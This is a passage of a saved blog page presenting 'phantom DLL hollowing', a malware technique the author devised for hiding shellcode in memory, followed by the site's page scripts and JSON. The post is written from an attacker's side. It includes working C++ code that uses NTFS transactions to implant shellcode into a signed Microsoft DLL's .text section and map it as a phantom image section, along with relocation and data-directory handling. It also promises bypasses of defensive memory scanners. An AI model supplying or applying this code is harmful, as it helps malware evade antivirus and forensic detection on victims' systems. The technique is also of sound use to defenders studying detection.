+within the address space of the process which modified it. This 
+characteristic provides a valuable artifact for defenders who aim to 
+identify modified regions of image memory without relying on runtime 
+interception of modifications to the PTE. In Figure 6 above, it can be 
+clearly seen that the substantial majority of aadauthhelper.dll in 
+memory is shared, as is typical of mapped image memory. Notably though, 
+two regions of the image address space (corresponding to the .data and 
+.didat sections) have two private pages associated with them. This is 
+because these sections are writable, and whenever a previously 
+unmodified page within their regions is modified it will be made private
+ on a per-page basis. After allowing my hollower to change the 
+protections of the .text section and infect a region with my shellcode, 
+4K (the default size of a single page) within the .text sections is 
+suddenly marked as private rather than shared. Notably, however many 
+bytes of a shared region are modified (even if it is only one byte) the 
+total size of the affected region will be rounded up to a multiple of 
+the default page size. In this case, my shellcode was 784 bytes which 
+was rounded up to 0x1000, and a full page within .text was made private 
+despite a considerably smaller number of shellcode bytes being written. 
+Thankfully for us attackers, it is indeed possible to modify an image of
+ a signed PE without changing its contents on disk, and prior to mapping
+ a view of it into memory using transacted NTFS (TxF). Originally 
+designed to provide easy rollback functionality to installers, TxF was 
+implemented in such a way by Microsoft that it allows for complete 
+isolation of transacted data from external applications (including 
+AntiVirus). Therefore if a malware writer opens a TxF file handle to a 
+legitimate Microsoft signed PE file on disk, he can conspicuously use an
+ API such as NTDLL.DLL!NtWriteFile to overwrite the contents of this PE 
+while never causing the malware to be scanned when touching disk (as he 
+has not truly modified the PE on disk). He then has a phantom file 
+handle referencing a file object containing malware which can be used 
+the same as a regular file handle would, with the key difference that it
+ is backed by an unmodified and legitimate/signed file of his choice. As
+ previously discussed, NTDLL.DLL!NtCreateSection consumes a file handle 
+when called with SEC_IMAGE, and the resulting section may be mapped into
+ memory using NTDLL.DLL!NtMapViewOfSection. To the great fortune of the 
+malware writer, these may be transacted file handles, effectively 
+providing him a means of creating phantom image sections. The essence of
+ phantom DLL hollowing is that an attacker can open a TxF handle to a 
+Microsoft signed DLL file on disk, infect its .text section with his 
+shellcode, and then generate a phantom section from this 
+malware-implanted image and map a view of it to the address space of a 
+process of his choice. The file object underlying the mapping will still
+ point back to the legitimate Microsoft signed DLL on disk (which has 
+not changed) however the view in memory will contain his shellcode 
+hidden in its .text section with +RX permissions. NtStatus = 
+NtCreateTransaction(&amp;hTransaction, TRANSACTION_ALL_ACCESS, 
+&amp;ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr); hFile = 
+CreateFileTransactedW(FilePath, GENERIC_WRITE | GENERIC_READ, // The 
+permission to write to the DLL on disk is required even though we 
+technically aren't doing this. 0, nullptr, OPEN_EXISTING, 
+FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr); ... 
+memcpy(pFileBuf + pSectHdrs-&gt;PointerToRawData + dwCodeRva, pCodeBuf, 
+dwReqBufSize); if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&amp; 
+dwBytesWritten, nullptr)) { HANDLE hSection = nullptr; NtStatus = 
+NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, nullptr, nullptr, 
+PAGE_READONLY, SEC_IMAGE, hFile); if (NT_SUCCESS(NtStatus)) { 
+*pqwMapBufSize = 0; NtStatus = NtMapViewOfSection(hSection, 
+GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, 
+(PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); } } Notably in the snippet
+ above, rather than using the .text IMAGE_SECTION_HEADER.VirtualAddress 
+to identify the infection address of my shellcode I am using 
+IMAGE_SECTION_HEADER.PointerToRawData. This is due to the fact that 
+although I am not writing any content to disk, the PE file is still 
+technically physical in the sense that it has not yet been mapped in to 
+memory. Most relevant in the side effects of this is the fact that the 
+sections will begin at IMAGE_OPTIONAL_HEADER.FileAlignment offsets 
+rather than IMAGE_OPTIONAL_HEADER.SectionAlignment offsets, the latter 
+of which typically corresponds to the default page size. The only 
+drawback of phantom DLL hollowing is that even though we are not writing
+ to the image we are hollowing on disk (which will typically be 
+protected In System32 and unwritable without admin and UAC elevation) in
+ order to use APIs such as NTDLL.DLL!NtWriteFile to write malware to 
+phantom files, one must first open a handle to its underlying file on 
+disk with write permissions. In the case of an attacker who does not 
+have sufficient privileges to create their desired TxF handle, a 
+solution is to simply copy a DLL from System32 to the malware’s 
+application directory and open a writable handle to this copy. The path 
+of this file is less stealthy to a human analyst, however from a 
+program’s point of view the file is still a legitimate Microsoft signed 
+DLL and such DLLs often exist in many directories outside of System32, 
+making an automated detection without false positives much more 
+difficult. Another important consideration with phantom sections is that
+ it is not safe to modify the .text section at an arbitrary offset. This
+ is because a .text section within an image mapped to memory will look 
+different from its equivalent file on disk, and because it may contain 
+data directories whose modification will corrupt the PE. When 
+relocations are applied to the PE, this will cause all of the absolute 
+addresses within the file to be modified (re-based) to reflect the image
+ base selected by the OS, due to ASLR. If shellcode is written to a 
+region of code containing absolute address references, it will cause the
+ shellcode to be corrupted when NTDLL.DLL!NtMapViewOfSection is called. 
+bool CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, 
+uint32_t dwStartRVA, uint32_t dwEndRVA) { IMAGE_BASE_RELOCATION * 
+pCurrentRelocBlock; uint32_t dwRelocBufOffset, dwX; bool bWithinRange = 
+false; for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION *)pRelocBuf, dwX
+ = 0, dwRelocBufOffset = 0; pCurrentRelocBlock-&gt;SizeOfBlock; dwX++) {
+ uint32_t dwNumBlocks = ((pCurrentRelocBlock-&gt;SizeOfBlock - 
+sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t)); uint16_t 
+*pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + 
+sizeof(IMAGE_BASE_RELOCATION)); for (uint32_t dwY = 0; dwY &lt; 
+dwNumBlocks; dwY++, pwCurrentRelocEntry++) { #ifdef _WIN64 #define 
+RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_DIR64 #else #define 
+RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW #endif if 
+(((*pwCurrentRelocEntry &gt;&gt; 12) &amp; RELOC_FLAG_ARCH_AGNOSTIC) == 
+RELOC_FLAG_ARCH_AGNOSTIC) { uint32_t dwRelocEntryRefLocRva = 
+(pCurrentRelocBlock-&gt;VirtualAddress + (*pwCurrentRelocEntry &amp; 
+0x0FFF)); if (dwRelocEntryRefLocRva &gt;= dwStartRVA &amp;&amp; 
+dwRelocEntryRefLocRva &lt; dwEndRVA) { bWithinRange = true; } } } 
+dwRelocBufOffset += pCurrentRelocBlock-&gt;SizeOfBlock; 
+pCurrentRelocBlock = (IMAGE_BASE_RELOCATION 
+*)((uint8_t*)pCurrentRelocBlock + pCurrentRelocBlock-&gt;SizeOfBlock); }
+ return bWithinRange; } In the code above, a gap of sufficient size is 
+identified within our intended DLL image by walking the base relocation 
+data directory. Additionally, as previously mentioned 
+NTDLL.DLL!NtCreateSection will fail if an invalid PE is used as a handle
+ for SEC_IMAGE initialization. In many Windows DLLs, data directories 
+(such as TLS, configuration data, exports and others) are stored within 
+the .text section itself. This means that by overwriting these data 
+directories with a shellcode implant, we may invalidate existing data 
+directories, thus corrupting the PE and causing 
+NTDLL.DLL!NtCreateSection to fail. for (uint32_t dwX = 0; dwX &lt; 
+pNtHdrs-&gt;OptionalHeader.NumberOfRvaAndSizes; dwX++) { if 
+(pNtHdrs-&gt;OptionalHeader.DataDirectory[dwX].VirtualAddress &gt;= 
+pSectHdrs-&gt;VirtualAddress &amp;&amp; 
+pNtHdrs-&gt;OptionalHeader.DataDirectory[dwX].VirtualAddress &lt; 
+(pSectHdrs-&gt;VirtualAddress + pSectHdrs-&gt;Misc.VirtualSize)) { 
+pNtHdrs-&gt;OptionalHeader.DataDirectory[dwX].VirtualAddress = 0; 
+pNtHdrs-&gt;OptionalHeader.DataDirectory[dwX].Size = 0; } } In the code 
+above I am wiping data directories that point within the .text section. A
+ more elegant solution is to look for gaps between the data directories 
+in .text, similar to how I found gaps within the relocations. However, 
+this is less simple than it sounds, as many of these directories 
+themselves contain references to additional data directories (load 
+config is a good example, which contains many RVA which may also fall 
+within .text). For the purposes of this PoC I’ve simply wiped 
+conflicting data directories. Since the module will never be run, doing 
+so will not affect its execution nor will it affect ours since we are 
+using a PIC shellcode. Last thoughts Attackers have long been overdue 
+for a major shift and leap forward in their malware design, particularly
+ in the area of memory forensics. I believe that DLL hollowing is likely
+ to become a ubiquitous characteristic of malware memory allocation over
+ the next several years, and this will prompt malware writers to further
+ refine their techniques and adopt my method of phantom DLL hollowing, 
+or new (and still undiscovered) methods of thwarting analysis of PE 
+images in memory vs. on disk. Until such a time that innovations in 
+theory are called for, I believe it is more valuable to focus on 
+practical solutions to existing defensive technology. For this reason, 
+in my next post in this series I will discuss bypasses for defensive 
+scanners such as Get-InjectedThread, Malfind and Hollowfind.</div></div></div></div></a><div class="_1vZkh _2bQy8 _1ZW5T"><div class="_2Dps0 _3CI45 _2bQy8 blog-separator-background-color"></div><div class="blog-post-description-font"><div class="fhim2 blog-post-description-font blog-text-color post-footer"><div class="_60xHi"><div class="MEOqZ post-stats" data-hook="post-stats"><span>291 views</span><a class="_3EfO5" href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing" target="_top"><span data-hook="write-comment__label" class="_24h-e">Write a comment</span></a></div></div><div class="vP6YT"><button class="_3Bdxz post-footer__like-button"><span class="_3BTGY" data-hook="like-button-with-count__like-count"><div class="like-button _7QZoA" aria-label="Post not marked as liked" role="button" data-hook="like-button"><div class="JuFMG"><div class="_3GAmo"></div></div><div class="_1UeeA"><div class="_3GAmo"></div></div><div class="_3KlwM"><div class="_3GAmo"></div></div><div class="uanT3"><div class="_3GAmo"></div></div><div class="_2x4gn"></div><svg xmlns="http://www.w3.org/2000/svg" width="19" viewBox="0 0 19 19" role="img"><path d="M9.44985848,15.5291774 C9.43911371,15.5362849 9.42782916,15.5449227 9.41715267,15.5553324 L9.44985848,15.5291774 Z M9.44985848,15.5291774 L9.49370677,15.4941118 C9.15422701,15.7147757 10.2318883,15.0314406 10.7297038,14.6971183 C11.5633567,14.1372547 12.3827081,13.5410755 13.1475707,12.9201001 C14.3829188,11.9171478 15.3570936,10.9445466 15.9707237,10.0482572 C16.0768097,9.89330422 16.1713564,9.74160032 16.2509104,9.59910798 C17.0201658,8.17755699 17.2088969,6.78363112 16.7499013,5.65913129 C16.4604017,4.81092573 15.7231445,4.11008901 14.7401472,3.70936139 C13.1379564,3.11266008 11.0475663,3.84092251 9.89976068,5.36430396 L9.50799408,5.8842613 L9.10670536,5.37161711 C7.94954806,3.89335486 6.00516066,3.14638251 4.31830373,3.71958508 C3.36517186,4.00646284 2.65439601,4.72068063 2.23964629,5.77358234 C1.79050315,6.87166888 1.98214559,8.26476279 2.74015555,9.58185512 C2.94777753,9.93163559 3.23221417,10.3090129 3.5869453,10.7089994 C4.17752179,11.3749196 4.94653811,12.0862394 5.85617417,12.8273544 C7.11233096,13.8507929 9.65858244,15.6292133 9.58280954,15.555334 C9.53938013,15.5129899 9.48608859,15.5 9.50042471,15.5 C9.5105974,15.5 9.48275828,15.5074148 9.44985848,15.5291774 Z"></path></svg></div></span></button></div></div></div></div></div></article></div></div></div></div><div></div></div></div></div></div></div></div></div></div></div>
+
+      
+        <script>
+  var p = function(x) { return x.split('=', 2).map(decodeURIComponent); };
+  var r = function(acc, x) { acc[x[0]] = x[1]; return acc; };
+  var q = location.search.replace(/^\?/, '').split('&').map(p).reduce(r, {});
+  window.parent.postMessage(
+  '{"intent":"TPA2","callId":1,"type":"applicationLoadingStep","compId":"' + q.compId + '","deviceType":"' + q.deviceType + '","data":{"version":"1.94.0", "args":{"stage":"firstMeaningfulPaint", "stageNum":0}}}', '*'
+  );
+</script>
+
+      
+
+      
+        <script>
+(function() {
+    if (!(window.createImageBitmap && window.fetch)) return false;
+    fetch('data:image/webp;base64,UklGRh4AAABXRUJQVlA4TBEAAAAvAAAAAAfQ//73v/+BiOh/AAA=')
+    .then(function(r){return r.blob();})
+    .then(createImageBitmap)
+    .then(function() {return true;}, function() {return false;})
+    .then(function(isWebPSupported){window.__IS_WEBP_SUPPORTED__ = isWebPSupported});
+})();
+</script>
+
+        <script>
+  window.wixTpaWindowResize = {
+    elSelector: '#content-wrapper',
+    enableViewportFix: false,
+  };
+</script>
+<script>!function(){"use strict";!function(e){var n=e.wixTpaWindowResize;if(n){if(!n.elSelector)return console.error("Aborting window resize handler: you must specify a css selector");var i,t=decodeURIComponent(e.location.search).split("&").reduce(function(e,n){var i=n.split("=");return e[i[0]]=i[1],e},{}),o=320,r=n.elSelector,a=n.interval||160,s=n.minHeight||null,c=n.disableOnMobile||!1,l=n.enableViewportFix||!1,d="mobile"===t.deviceType,u=["editor","preview"].indexOf(t.viewMode)>-1,h=n.onInit||function(){},f=!1!==n.listenOnInit,v=!0===n.log;d&&c||(f&&g(),h({startListening:g,stopListening:m}))}function p(e){v&&console.log("window-resize-handler ",e)}function w(n){var i=n.scrollHeight*(d&&l?o/(u?o:function(){var n=!1;if(void 0!==e.orientation)n=90===e.orientation||-90===e.orientation;else{var i=e.matchMedia("(orientation: landscape)");n=!(!i||!0!==i.matches)}return n}()?Math.max(e.screen.width,e.screen.height):e.screen.width):1);return s?Math.max(i,s):i}function g(){var n=0;i=e.setInterval(function(){var i=e.document.querySelector(r);if(i){var t=w(i);n===t&&e.innerHeight===t||(n=t,function(n){e.Wix?(p("window.Wix.setHeight"),e.Wix.setHeight(n)):(p("window.parent.postMessage"),e.parent.postMessage('{"intent":"TPA2","callId":1,"type":"heightChanged","compId":"'+e.name+'","deviceType":"desktop","data":{"version":"1.66.0", "args":{"height":"'+n+'", "overflow":"false"}}}',"*"))}(t))}},a)}function m(){e.clearInterval(i)}}(window)}();
+</script>
+
+
+        <script src="modal_data/wix-private.js" crossorigin=""></script>
+
+
+        <script src="react.js" crossorigin=""></script>
+<script src="react-dom.js" crossorigin=""></script>
+
+        <script src="modal_data/lodash.js" crossorigin=""></script>
+
+
+        <script src="modal_data/ReactPlayer.js" crossorigin=""></script>
+
+
+        <script src="custom-feed-widget_data/custom-feed-widget.js" crossorigin="" defer="defer"></script>
+
+        
+
+        <script>
+          window.__INITIAL_STATE__ = {"appData":{"_id":"78e72780-ec1a-4e43-97c1-217c79d55e2f","label":"Your Blog","menuLabel":"Posts","description":"","language":"en","subject":"finance","cover":{"original_file_name":"a27d24_85296a50517f45428acb01b9c4911ba1~mv2_d_3992_1513_s_2.jpg","file_name":"a27d24_85296a50517f45428acb01b9c4911ba1~mv2_d_3992_1513_s_2.jpg","width":3992,"height":1513},"overlayColor":{"color":"#ffffff","opacity":0.35},"backgroundColor":{"color":"#FFFFFF","opacity":0},"coverType":"color","textColor":{"color":"#000000","opacity":1},"postPageEnabled":true,"sendEmailsToSiteSubscribers":false},"appSettings":{"colorPresets":[{"name":"color_1","value":"#FFFFFF","reference":"white\u002Fblack"},{"name":"color_2","value":"#000000","reference":"black\u002Fwhite"},{"name":"color_3","value":"#ED1C24","reference":"primery-1"},{"name":"color_4","value":"#0088CB","reference":"primery-2"},{"name":"color_5","value":"#FFCB05","reference":"primery-3"},{"name":"color_11","value":"#FFFFFF","reference":"color-1"},{"name":"color_12","value":"#F6F6F6","reference":"color-2"},{"name":"color_13","value":"#B3B3B3","reference":"color-3"},{"name":"color_14","value":"#605E5E","reference":"color-4"},{"name":"color_15","value":"#2F2E2E","reference":"color-5"},{"name":"color_16","value":"#BAE9FF","reference":"color-6"},{"name":"color_17","value":"#97DEFF","reference":"color-7"},{"name":"color_18","value":"#30BDFF","reference":"color-8"},{"name":"color_19","value":"#207EA9","reference":"color-9"},{"name":"color_20","value":"#103F54","reference":"color-10"},{"name":"color_21","value":"#B6E8E3","reference":"color-11"},{"name":"color_22","value":"#8DD1CA","reference":"color-12"},{"name":"color_23","value":"#41BAAE","reference":"color-13"},{"name":"color_24","value":"#2B7C74","reference":"color-14"},{"name":"color_25","value":"#163E3A","reference":"color-15"},{"name":"color_26","value":"#F4C0AF","reference":"color-16"},{"name":"color_27","value":"#E99F86","reference":"color-17"},{"name":"color_28","value":"#DE5021","reference":"color-18"},{"name":"color_29","value":"#943616","reference":"color-19"},{"name":"color_30","value":"#4A1B0B","reference":"color-20"},{"name":"color_31","value":"#F4EAB1","reference":"color-21"},{"name":"color_32","value":"#E9DB89","reference":"color-22"},{"name":"color_33","value":"#DEC328","reference":"color-23"},{"name":"color_34","value":"#94821B","reference":"color-24"},{"name":"color_35","value":"#4A410D","reference":"color-25"}],"textPresets":{"Title":{"editorKey":"font_0","lineHeight":"1.4em","style":"normal","weight":"normal","size":"89px","fontFamily":"georgia","value":"font:normal normal normal 89px\u002F1.4em georgia,palatino,\"book antiqua\",\"palatino linotype\",serif;"},"Menu":{"editorKey":"font_1","lineHeight":"1.4em","style":"normal","weight":"normal","size":"16px","fontFamily":"din-next-w01-light","value":"font:normal normal normal 16px\u002F1.4em din-next-w01-light,din-next-w02-light,din-next-w10-light,sans-serif;"},"Page-title":{"editorKey":"font_2","lineHeight":"1.4em","style":"normal","weight":"normal","size":"25px","fontFamily":"georgia","value":"font:normal normal normal 25px\u002F1.4em georgia,palatino,\"book antiqua\",\"palatino linotype\",serif;"},"Heading-XL":{"editorKey":"font_3","lineHeight":"1.4em","style":"normal","weight":"normal","size":"60px","fontFamily":"din-next-w01-light","value":"font:normal normal normal 60px\u002F1.4em din-next-w01-light,din-next-w02-light,din-next-w10-light,sans-serif;"},"Heading-L":{"editorKey":"font_4","lineHeight":"1.4em","style":"normal","weight":"normal","size":"58px","fontFamily":"georgia","value":"font:normal normal normal 58px\u002F1.4em georgia,palatino,\"book antiqua\",\"palatino linotype\",serif;"},"Heading-M":{"editorKey":"font_5","lineHeight":"1.4em","style":"italic","weight":"normal","size":"22px","fontFamily":"georgia","value":"font:italic normal normal 22px\u002F1.4em georgia,palatino,\"book antiqua\",\"palatino linotype\",serif;"},"Heading-S":{"editorKey":"font_6","lineHeight":"1.4em","style":"normal","weight":"normal","size":"21px","fontFamily":"dinneuzeitgroteskltw01-_812426","value":"font:normal normal normal 21px\u002F1.4em dinneuzeitgroteskltw01-_812426,sans-serif;"},"Body-L":{"editorKey":"font_7","lineHeight":"1.4em","style":"normal","weight":"normal","size":"22px","fontFamily":"libre baskerville","value":"font:normal normal normal 22px\u002F1.4em \"libre baskerville\",serif;"},"Body-M":{"editorKey":"font_8","lineHeight":"1.4em","style":"normal","weight":"normal","size":"16px","fontFamily":"libre baskerville","value":"font:normal normal normal 16px\u002F1.4em \"libre baskerville\",serif;"},"Body-S":{"editorKey":"font_9","lineHeight":"1.4em","style":"normal","weight":"normal","size":"14px","fontFamily":"georgia","value":"font:normal normal normal 14px\u002F1.4em georgia,palatino,\"book antiqua\",\"palatino linotype\",serif;"},"Body-XS":{"editorKey":"font_10","lineHeight":"1.4em","style":"normal","weight":"normal","size":"12px","fontFamily":"din-next-w01-light","value":"font:normal normal normal 12px\u002F1.4em din-next-w01-light,din-next-w02-light,din-next-w10-light,sans-serif;"}},"updatedAt":1576010641178,"style":{"cssUrls":["\u002F\u002Fstatic.parastorage.com\u002Fservices\u002Fsanta-resources\u002Fresources\u002Fviewer\u002Fuser-site-fonts\u002Fv3\u002Flanguages.css","\u002F\u002Fstatic.parastorage.com\u002Fservices\u002Fsanta-resources\u002Fresources\u002Fviewer\u002Fuser-site-fonts\u002Fv5\u002Flanguages.css","\u002F\u002Fstatic.parastorage.com\u002Fservices\u002Fsanta-resources\u002Fresources\u002Fviewer\u002Fuser-site-fonts\u002Fv7\u002Flanguages.css"],"colors":{"post-titleColor-standard":{"themeName":"color-3","value":"rgba(179,179,179,1)"},"post-descriptionColor-standard":{"themeName":"color-3","value":"rgba(179,179,179,1)"},"post-titleColo-textOnImager":{"value":"rgba(255,255,255,1)"},"post-descriptionColo-textOnImager":{"value":"rgba(255,255,255,1)"},"post-hoverColor-standard":{"themeName":"color-24","value":"rgba(148,130,27,1)"},"post-borderColor":{"themeName":"color-2","value":"rgba(246,246,246,0.75)"},"post-imageOverlayColor":{"value":"rgba(0,0,0,0.35)"},"post-backgroundColor":{"themeName":"color-1","value":"rgba(255,255,255,0)"},"widget-backgroundColor":{"themeName":"color-1","value":"rgba(255,255,255,0)"},"post-titleColor":{"value":"rgba(179,179,179,1)","themeName":"color-3"},"post-descriptionColor":{"value":"rgba(179,179,179,1)","themeName":"color-3"},"post-hoverColor":{"value":"rgba(148,130,27,1)","themeName":"color-24"}},"numbers":{"list-numberOfPosts":3,"list-layoutId":6},"booleans":{"blog-isAuthorNameEnabled":true,"blog-isPostDateEnabled":true,"blog-isViewCountEnabled":true,"blog-isPostListFullWidthEnabled":true,"blog-isCommentCountEnabled":true,"blog-isLikeCountEnabled":true,"blog-isAuthorBadgeEnabled":true,"blog-isAuthorPictureEnabled":false,"blog-isReadingTimeEnabled":true},"fonts":{"post-titleFont-standard":{"family":"wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas","displayName":"Heading 1","style":{"bold":false,"italic":false,"underline":false},"size":89,"preset":"Custom","editorKey":"font_0","fontStyleParam":true,"value":"font:normal normal normal 89px\u002F111px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas;"},"post-descriptionFont-standard":{"family":"wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas","displayName":"Paragraph 2","style":{"bold":false,"italic":false,"underline":false},"size":16,"preset":"Custom","editorKey":"font_8","fontStyleParam":true,"value":"font:normal normal normal 16px\u002F20px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas;"},"post-titleFont-textOnImage":{"family":"wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas","displayName":"Page Title","style":{"bold":false,"italic":false,"underline":false},"size":28,"preset":"Custom","editorKey":"font_2","fontStyleParam":true,"value":"font:normal normal normal 28px\u002F35px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas;"},"post-descriptionFont-textOnImage":{"family":"wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas","displayName":"Paragraph 2","style":{"bold":false,"italic":false,"underline":false},"size":16,"preset":"Custom","editorKey":"font_8","fontStyleParam":true,"value":"font:normal normal normal 16px\u002F20px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas;"},"ignored-as-color-picker-does-not-support-info-text":{"family":"georgia","displayName":"Page Title","style":{"bold":false,"italic":false,"underline":false},"size":25,"preset":"Page-title","editorKey":"font_2","fontStyleParam":true,"value":"font:normal normal normal 25px\u002F1.4em georgia,palatino,\"book antiqua\",\"palatino linotype\",serif;"},"post-titleFont":{"family":"wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas","displayName":"Page Title","style":{"bold":false,"italic":false,"underline":false},"size":28,"preset":"Custom","editorKey":"font_0","fontStyleParam":true,"value":"font:normal normal normal 28px\u002F35px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas;"},"post-descriptionFont":{"family":"wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas","displayName":"Paragraph 2","style":{"bold":false,"italic":false,"underline":false},"size":16,"preset":"Custom","editorKey":"font_8","fontStyleParam":true,"value":"font:normal normal normal 16px\u002F20px wfont_c1d8f6_a06df987aac84453946eecb8586c794d,wf_a06df987aac84453946eecb85,orig_consolas;"}},"googleFontsCssUrl":"\u002F\u002Ffonts.googleapis.com\u002Fcss?family=Libre+Baskerville:n,b,i,bi|&subset=latin","uploadFontFaces":"@font-face {\nfont-family: wf_a06df987aac84453946eecb85;\nsrc: url(\"https:\u002F\u002Fstatic.wixstatic.com\u002Fufonts\u002Fc1d8f6_a06df987aac84453946eecb8586c794d\u002Fwoff\u002Ffile.woff\") format(\"woff\"),\nurl(\"https:\u002F\u002Fstatic.wixstatic.com\u002Fufonts\u002Fc1d8f6_a06df987aac84453946eecb8586c794d\u002Fwoff2\u002Ffile.woff2\") format(\"woff2\"),\nurl(\"https:\u002F\u002Fstatic.wixstatic.com\u002Fufonts\u002Fc1d8f6_a06df987aac84453946eecb8586c794d\u002Fttf\u002Ffile.ttf\") format(\"ttf\");\n}\n"},"custom":{}},"commonSettings":{},"auth":{"currentUser":null,"isAuthenticated":false,"isAuthenticating":false},"communitiesContext":{"14ad9202-3dd3-128a-57bd-e5675fd7e313":{"isInstalled":false,"baseUrl":"https:\u002F\u002Fapps.wix.com\u002Fmembers","baseStaticUrl":"\u002F\u002Fstatic.parastorage.com\u002Fservices\u002Fcommunities-members-app\u002F1.381.0\u002F"},"14cc59bc-f0b7-15b8-e1c7-89ce41d0e0c9":{"isInstalled":false}},"experiments":{"se_newBlogQuickMigration":"old","specs.wixBlog.NewPingAPI":"true","specs.wixBlog.PublishToDuplexer":"true","specs.wixBlog.CollectMetrics":"false","specs.wixBlog.ProvidePathToPost":"true","specs.wixBlog.DisableBeaconInOneApp":"true","specs.wixBlog.MobileLayoutUpdatedStyle":"true","specs.wixBlog.RcvTextColorPlugin":"true","specs.wixBlog.ProdOOI":"false","specs.wixBlog.SendEmailsThroughPing":"true","specs.wixBlog.NextProdOOI":"false","com.wixpress.communities.blog.subscription.experiments.AutoSubscribeToBlogNotifications":"true","specs.wixBlog.UsePrecomputedPostFields":"true","specs.wixBlog.ProvisionPostPage":"true","specs.wixBlog.UseNextRCE":"true","specs.wixBlog.ValidateViewMode":"false","specs.wixBlog.ExcludePostContent":"true","specs.wixBlog.InlineCss":"false","specs.wixBlog.DisplayCategoriesFromPost":"true","specs.wixBlog.CommentCounterOff":"false","specs.wixBlog.AnonymousLikes":"true","specs.wixBlog.EmotionInstancePerRequest":"true","specs.blogImporter.EnableRollbackOfMigrationsBM":"false","specs.wixBlog.CreateOfflineUser":"true","specs.wixBlog.SeparateTranslationsForRecentPosts":"true","specs.wixBlog.RcvGiphyPlugin":"false","specs.wixBlog.UsePingSubscriptionService":"true","specs.wixBlog.UseSiteQueryService":"false","specs.wixBlog.UseRelooseInBlogApp":"true","specs.wixBlog.OptimizeCustomFeedBundle":"true","specs.wixBlog.UseDuplexer":"true","specs.wixBlog.ConditionallyIncludeRce":"false","specs.wixBlog.MetaSiteServiceUseReloose":"true","specs.wixBlog.ShareOnLinkedIn":"true","specs.wixBlog.SeparateRecentPostsWidgetBundles":"true"},"isAppLoaded":false,"isDemoMode":false,"isLoaded":{"feed-posts":true},"isLoading":{"feed-posts":false},"pagination":{"comments":{"entitiesByPage":{}},"posts":{"entitiesByPage":{"1":["5d9522f75935600017eb4031"]},"currentPage":1,"pageSize":3,"entityCount":1},"posts-unpublished":{"entitiesByPage":{}},"posts-published":{"entitiesByPage":{}},"posts-scheduled":{"entitiesByPage":{}},"posts-deleted":{"entitiesByPage":{}}},"posts":{"5d9522f75935600017eb4031":{"_id":"5d9522f75935600017eb4031","instanceId":"78e72780-ec1a-4e43-97c1-217c79d55e2f","status":"published","categoryIds":[],"createdDate":"2019-10-02T22:21:43.981Z","lastPublishedDate":"2019-10-08T16:10:51.015Z","slugs":["malicious-memory-artifacts-part-i-dll-hollowing"],"seoSlug":"malicious-memory-artifacts-part-i-dll-hollowing","seoDescription":"This will be the first post in a series on malware memory forensics and bypassing defensive scanners. It was written with the assumption that the reader understands the basics of Windows internals and malware design. I will not be discussing the nature of the shellcode, process injection, process hollowing","ownerId":"5d93ba86d7041a0017564e20","ownerSiteMemberId":"c1d8f646-2e7f-4989-bd55-0f3142c74189","lastWriterId":"5d93ba86d7041a0017564e20","isPinned":false,"isCommentsDisabled":false,"likeCount":0,"timeToRead":14,"viewCount":291,"totalComments":0,"lastActivityDate":"2019-10-02T22:21:43.981Z","isFeatured":false,"firstPublishedDate":"2019-10-02T22:23:21.231Z","seoShowInSearch":true,"seoShowSnippetInSearch":true,"title":"Masking Malicious Memory Artifacts – Part I: Phantom DLL Hollowing","excerpt":"Introduction I've written this article with the intention of improving the skill of the reader as relating to the topic of memory stealth when designing malware. First by detailing a technique I term DLL hollowing which has not yet gained widespread recognition among attackers, and second by introducing the reader to one of my own variations of this technique which I call phantom DLL hollowing (the PoC for which can be found on Github). This will be the first post in a series on malware forensics and bypassing defensive scanners. It was written with the assumption that the reader understands the basics of Windows internals and malware design. Legitimate memory allocation In order to understand how defenders are able to pick up on malicious memory artifacts with minimal false positives using point-in-time memory scanners such as Get-InjectedThread and malfind it is essential for one to understand what constitutes “normal” memory allocation and how malicious allocation deviates from this norm. For our purposes, typical process memory can be broken up into 3 different categories: Private memory – not to be confused with memory that is un-shareable with other processes. All memory allocated via NTDLL.DLL!NtAllocateVirtualMemory falls into this category (this includes heap and stack memory). Mapped memory – mapped views of sections which may or may not be created from files on disk. This does not include PE files mapped from sections created with the SEC_IMAGE flag. Image memory – mapped views of sections created with the SEC_IMAGE flag from PE files on disk. This is distinct from mapped memory. Although image memory is technically a mapped view of a file on disk just as mapped memory may be, they are distinctively different categories of memory. These categories directly correspond to the Type field in the MEMORY_BASIC_INFORMATION structure. This structure is strictly a usermode concept, and is not stored independently but rather is populated using the kernel mode VAD, PTE and section objects associated with the specified process. On a deeper level the key difference between private and shared (mapped\u002Fimage) memory is that shared memory is derived from section objects, a construct specifically designed to allow memory to be shared between processes. With this being said, the term “private memory” can be a confusing terminology in that it implies all sections are shared between processes, which is not the case. Sections and their related mapped memory may also be private although they will not technically be “private 